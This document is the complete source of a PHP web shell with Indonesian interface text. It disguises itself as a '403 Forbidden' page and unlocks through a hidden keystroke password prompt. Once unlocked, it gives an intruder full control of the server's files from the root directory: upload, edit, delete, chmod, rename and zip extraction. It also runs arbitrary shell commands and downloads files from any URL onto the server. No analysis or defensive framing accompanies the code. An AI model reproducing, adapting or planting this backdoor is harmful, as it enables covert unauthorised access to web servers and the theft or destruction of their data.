<?php
session_start();
error_reporting(0);
set_time_limit(0);

$auth_hash = 'efb0229fee45e63556609731f831e491';

if (isset($_POST['stealth_pass'])) {
    $input = $_POST['stealth_pass'];
    if (md5($input) === $auth_hash) {
        $_SESSION['ok'] = true;
        echo 'OK';
    } else {
        echo 'FAIL';
    }
    exit;
}

if (!isset($_SESSION['ok'])) {
    echo "<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body>";
    echo "<h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p>";
    echo "</body></html>";

    echo '
    <script>
    let trigger = false;
    let typed = "";
    document.addEventListener("keydown", function(e) {
        if (e.ctrlKey && e.altKey && e.key.toLowerCase() === "s") {
            trigger = true;
            typed = "";
            console.log("🟢 Stealth mode aktif. Ketik password langsung.");
        } else if (trigger) {
            if (e.key === "Enter") {
                fetch(location.href, {
                    method: "POST",
                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                    body: "stealth_pass=" + encodeURIComponent(typed)
                }).then(r => r.text()).then(res => {
                    if (res === "OK") location.reload();
                    else {
                        alert("❌ Password salah!");
                        trigger = false;
                    }
                });
                typed = "";
            } else if (e.key.length === 1) {
                typed += e.key;
            }
        }
    });
    </script>';
    exit;
}



$cwd = '/'; // Default start from root folder
$dir = isset($_GET['path']) ? $_GET['path'] : $cwd;
$dir = realpath($dir);
if ($dir === false || !is_dir($dir)) {
    die("❌ Invalid path.");
}


function formatSize($sizeVal) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($sizeVal >= 1024 && $i < count($units) - 1) {
        $sizeVal /= 1024;
        $i++;
    }
    return round($sizeVal, 2) . ' ' . $units[$i];
}

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function get_current_path_links($path) {
    $parts = explode('/', trim($path, '/'));
    $links = array();
    $cumulative = '';
    foreach ($parts as $part) {
        $cumulative .= '/' . $part;
        $links[] = "<a href='?path=" . $cumulative . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(' / ', $links);
}

function get_md5($file) {
    return is_file($file) ? md5_file($file) : '-';
}

function get_time($file, $type = 'modified') {
    $time = $type === 'created' ? filectime($file) : filemtime($file);
    return date("Y-m-d H:i:s", $time);
}

function zip_folder($folder, $zipfile) {
    $zip = new ZipArchive();
    if ($zip->open($zipfile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $folder = realpath($folder);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folder),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folder) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return true;
    }
    return false;
}



$upload_output = "";

$redirectPath = isset($_REQUEST['path']) ? $_REQUEST['path'] : $dir;

// === Create File ===
if (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
    $filename = $dir . "/" . basename($_POST['new_file_name']);
    if (!file_exists($filename)) {
        file_put_contents($filename, "");
        echo "✅ File created: " . htmlspecialchars($filename) . "<br>";
    } else {
        echo "⚠️ File already exists.<br>";
    }
}

// === Create Directory ===
if (isset($_POST['create_dir']) && !empty($_POST['new_dir_name'])) {
    $dirname = $dir . "/" . basename($_POST['new_dir_name']);
    if (!file_exists($dirname)) {
        mkdir($dirname);
        echo "✅ Directory created: " . htmlspecialchars($dirname) . "<br>";
    } else {
        echo "⚠️ Directory already exists.<br>";
    }
}

// === Upload File ===
if (isset($_FILES['upload'])) {
    $dest = $dir . "/" . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $upload_output .= "✅ Uploaded to $dest<br>";
    } else {
        $upload_output .= "❌ Upload failed<br>";
    }
}

// === Save File ===
if (isset($_POST['savefile']) && isset($_POST['content'])) {
    file_put_contents($_POST['savefile'], $_POST['content']);
    echo "<b>✅ File saved:</b> " . htmlspecialchars($_POST['savefile']) . "<br>";
}

// === Rename File/Folder ===
if (isset($_POST['rename']) && isset($_POST['newname'])) {
    rename($_POST['rename'], dirname($_POST['rename']) . '/' . $_POST['newname']);
    header("Location: ?path=" . urlencode($redirectPath));
    exit;
}

// === CHMOD File ===
if (isset($_POST['chmod']) && isset($_POST['chmod_file'])) {
    chmod($_POST['chmod_file'], octdec($_POST['chmod']));
    header("Location: ?path=" . urlencode($redirectPath));
    exit;
}

// === Delete File ===
if (isset($_GET['del']) && is_file($_GET['del'])) {
    unlink($_GET['del']);
    header("Location: ?path=" . urlencode(dirname($_GET['del'])));
    exit;
}

// === Extract ZIP ===
if (isset($_GET['extract'])) {
    $zip = new ZipArchive();
    if ($zip->open($_GET['extract']) === TRUE) {
        $zip->extractTo(dirname($_GET['extract']));
        $zip->close();
        echo "✅ Extracted: " . htmlspecialchars($_GET['extract']) . "<br>";
    } else {
        echo "❌ Failed to extract ZIP<br>";
    }
}

// === Zip Folder ===
if (isset($_POST['zip_folder']) && !empty($_POST['zip_target'])) {
    $target = $_POST['zip_target'];
    $zipname = $target . ".zip";
    if (zip_folder($target, $zipname)) {
        echo "✅ Folder zipped: $zipname<br>";
    } else {
        echo "❌ Failed to zip folder<br>";
    }
}

// === Command Executor ===
if (isset($_POST['cmd_exec']) && !empty($_POST['cmd'])) {
    echo "<pre style='background:#000;color:#0f0;padding:10px;'>" . htmlspecialchars(shell_exec($_POST['cmd'])) . "</pre>";
}

// === Download File from URL ===
if (isset($_POST['download_url'])) {
    $url = $_POST['download_url'];
    $target = $dir . '/' . basename(parse_url($url, PHP_URL_PATH));
    $data = file_get_contents($url);
    if ($data !== false) {
        file_put_contents($target, $data);
        echo "✅ File downloaded: $target<br>";
    } else {
        echo "❌ Download failed<br>";
    }
}

// === File Viewer ===
if (isset($_GET['view']) && is_file($_GET['view'])) {
    $file = $_GET['view'];
    $content = htmlspecialchars(file_get_contents($file));
    $perm = perms($file);
    echo "<h3>📄 File Viewer: " . basename($file) . "</h3>";
    echo "<form method='POST'>
    <textarea name='content' style='width:100%;height:400px;background:#111;color:#0f0;'>$content</textarea><br>
    <input type='submit' name='save' value='💾 Save' style='padding:10px;background:#0f0;color:#000;font-weight:bold;'>
    <input type='hidden' name='savefile' value='" . htmlspecialchars($file) . "'>
    </form><br>";

    echo "<form method='POST' style='display:inline;'>
        <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
        <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
        <input type='text' name='chmod' value='$perm' size='4'>
        <input type='submit' value='CHMOD'>
    </form>
    &nbsp;
    <form method='POST' style='display:inline;'>
        <input type='hidden' name='rename' value='" . htmlspecialchars($file) . "'>
        <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
        <input type='text' name='newname' value='" . basename($file) . "'>
        <input type='submit' value='Rename'>
    </form>
    &nbsp;
    <a href='?path=" . htmlspecialchars(dirname($file)) . "' style='color:#0af;'>🔙 Back</a>";
    exit;
}

// === List Files (dir + file)
$search = isset($_GET['search']) ? $_GET['search'] : '';
$files = scandir($dir);
$folders = $filelist = [];
foreach ($files as $f) {
    if ($f === "." || $f === "..") continue;
    if (is_dir("$dir/$f")) $folders[] = $f;
    else $filelist[] = $f;
}
natcasesort($folders);
natcasesort($filelist);
$files = array_merge($folders, $filelist);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>KHOIRUL JAWA PANTEK</title>
    <style>
        body { background:#111;color:#0f0;font-family:monospace;padding:20px; }
        a { color: #0af; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #0f0; padding: 5px; text-align: left; }
        .sysinfo { background: #000; border: 1px solid #0f0; padding: 10px; margin-bottom: 15px; }
    </style>
</head>
<body>
<h2>📁 KHOIRUL JAWA PANTEK</h2>
<div class="sysinfo">
<?php $shell_home = getcwd(); ?>
<b>Current Directory:</b> 
<a href='?path=/'>🏠 Root</a> | 
<a href='?path=<?php echo urlencode($shell_home); ?>'>💾 Shell Home</a> / 
<?php echo get_current_path_links($dir); ?>

</div>
<?php
$user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
$os = php_uname();
$server_ip = gethostbyname(gethostname());
$client_ip = $_SERVER['REMOTE_ADDR'];
$server_software = $_SERVER['SERVER_SOFTWARE'];
$php_version = phpversion();
?>
<div class="sysinfo">
    <b>🔐 User:</b> <?php echo htmlspecialchars($user); ?> &nbsp; | 
    <b>🖥 OS:</b> <?php echo htmlspecialchars($os); ?> &nbsp; | 
    <b>🌐 Server IP:</b> <?php echo htmlspecialchars($server_ip); ?> &nbsp; | 
    <b>👤 Client IP:</b> <?php echo htmlspecialchars($client_ip); ?> &nbsp; | 
    <b>⚙️ PHP:</b> <?php echo htmlspecialchars($php_version); ?> &nbsp; | 
    <b>🧰 Server:</b> <?php echo htmlspecialchars($server_software); ?>
</div>
<form method="GET">
    🔍 Search: <input type="text" name="search" value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
    <input type="submit" value="Find">
</form>
<form method="POST" enctype="multipart/form-data">
    Upload file: <input type="file" name="upload">
    <input type="submit" value="Upload">

    <form method="POST" id="createFileForm" style="margin-top:10px;" onsubmit="return submitCreateFile();">
    📄 Create File:
    <input type="text" name="new_file_name" id="newFileInput" placeholder="nama_file.txt">
    <input type="hidden" name="create_file" value="1">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($dir); ?>">
    <input type="submit" value="Create">
</form>

<script>
function submitCreateFile() {
    const input = document.getElementById("newFileInput");
    if (input.value.trim() === "") {
        alert("⚠️ Nama file tidak boleh kosong.");
        return false;
    }
    return true;
}
</script>


<!-- Create Directory -->
<form method="POST" id="createDirForm" style="margin-top:5px;" onsubmit="return submitCreateDir();">
    📁 Create Directory:
    <input type="text" name="new_dir_name" id="newDirInput" placeholder="nama_folder">
    <input type="hidden" name="create_dir" value="1">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($dir); ?>">
    <input type="submit" value="Create">
</form>

<script>
function submitCreateDir() {
    const input = document.getElementById("newDirInput");
    if (input.value.trim() === "") {
        alert("⚠️ Nama folder tidak boleh kosong.");
        return false;
    }
    return true;
}
</script>



<form method="POST">
<table>
<tr><th>🗑️</th><th>Nama</th><th>Ukuran</th><th>CHMOD</th><th>Owner</th><th>Group</th><th>Tipe</th><th>Aksi</th></tr>
<?php
foreach ($files as $f) {
    if ($f == ".") continue;
    if ($f == "..") {
        $parent = dirname($dir);
        echo "<tr><td></td><td><a href='?path=$parent'>🔙 Go Back</a></td><td>-</td><td>-</td><td>Dir</td><td>-</td><td>-</td></tr>";
        continue;
    }
    if ($search && stripos($f, $search) === false) continue;
    $path = "$dir/$f";
    $filesize = is_file($path) ? formatSize(filesize($path)) : '-';
    $perm = perms($path);
    $type = is_dir($path) ? 'Directory' : 'File';
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] : fileowner($path);
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] : filegroup($path);
    echo "<tr>
    <td><input type='checkbox' name='selected_files[]' value='" . htmlspecialchars($path) . "'></td>
    <td><a href='?" . (is_dir($path) ? "path" : "view") . "=" . urlencode($path) . "'>" . htmlspecialchars($f) . "</a></td>
    <td>$filesize</td>
    <td>
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='chmod_file' value='" . htmlspecialchars($path) . "'>
            <input type='text' name='chmod' value='$perm' size='4'>
            <input type='submit' value='Set'>
        </form>
    </td>
    <td>$owner</td>
    <td>$group</td>
    <td>$type</td>
    <td>";
    if (!is_dir($path)) {
        echo "<a href='?view=$path'>Open</a> | <a href='?del=$path' onclick='return confirm(\"Delete?\")'>Delete</a> ";
        echo "<form method='POST' style='display:inline;'>
    <input type='hidden' name='rename' value='" . htmlspecialchars($path) . "'>
    <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
    <input type='text' name='newname' value='" . basename($path) . "' style='width:100px;'>
    <input type='submit' value='Rename'>
</form>";
        if (preg_match('/\.zip$/i', $f)) {
            echo " | <a href='?extract=$path'>Extract ZIP</a>";
        }
    } else {
        echo "<form method='POST' style='display:inline;'><input type='hidden' name='zip_target' value='" . htmlspecialchars($path) . "'><input type='submit' name='zip_folder' value='ZIP'></form>";
    }
    echo "</td></tr>";
}
?>
</table>
<br>
<input type="submit" name="delete_selected" value="Delete Selected">
</form>
<hr><h3>🖥️ Terminal Executor</h3>
<form method="POST">
    <input type="text" name="cmd" placeholder="Contoh: whoami, id, ls -la, cd /tmp" style="width:70%;">
    <input type="submit" value="Execute">
</form>

<?php
session_start();

// Set direktori awal (hanya pertama kali)
if (!isset($_SESSION['cwd']) || !is_dir($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // <<== Ini akan simpan path saat file dieksekusi
}

if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $current = $_SESSION['cwd'];

    echo "<div style='background:#000;border:1px solid #0f0;padding:10px;margin-top:10px;font-family:monospace;'>";
    echo "<b>📂 Path:</b> <code style='color:#0ff;'>" . htmlspecialchars($current) . "</code><br>";
    echo "<b>📤 Command:</b> <code style='color:#0af;'>" . htmlspecialchars($cmd) . "</code><br><br>";
    echo "<b>📥 Output:</b><br><pre style='color:#0f0;white-space:pre-wrap;background:#111;padding:10px;border:1px dashed #0f0;'>";

    if (preg_match('/^cd\s*(.*)$/', $cmd, $match)) {
        $target = trim($match[1]);

        if ($target === '' || $target === '~') {
            // TETAP di direktori saat ini (tidak berubah)
            echo "✅ Stay in current directory: " . $_SESSION['cwd'];
        } elseif ($target === '-') {
            $_SESSION['cwd'] = dirname($current);
            echo "✅ Changed to: " . $_SESSION['cwd'];
        } else {
            $newPath = realpath($current . DIRECTORY_SEPARATOR . $target);
            if ($newPath && is_dir($newPath)) {
                $_SESSION['cwd'] = $newPath;
                echo "✅ Changed to: $newPath";
            } else {
                echo "⚠️ Directory not found or invalid: $target";
            }
        }
    } else {
        $exec = "cd " . escapeshellarg($current) . " && $cmd 2>&1";
        $output = shell_exec($exec);
        echo htmlspecialchars($output);
    }

    echo "</pre></div>";
}
?>


</body>
</html>
